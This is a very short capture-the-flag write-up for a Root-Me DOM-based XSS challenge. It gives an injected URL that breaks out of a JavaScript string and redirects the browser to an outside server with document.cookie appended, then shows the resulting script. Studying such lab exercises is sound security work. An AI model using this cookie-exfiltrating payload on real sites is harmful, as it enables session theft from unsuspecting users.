Simple XSS DOM based
```
http://challenge01.root-me.org/web-client/ch32/?number=123';document.location="https://my-server.com/?c=".concat(document.cookie);//
```

Resulting in:
```html
<script>
var random = Math.random() * (99);
var number = '123';
document.location='https://my-server.com?c='.concat(document.cookie);//';
.
.
.
</script>
```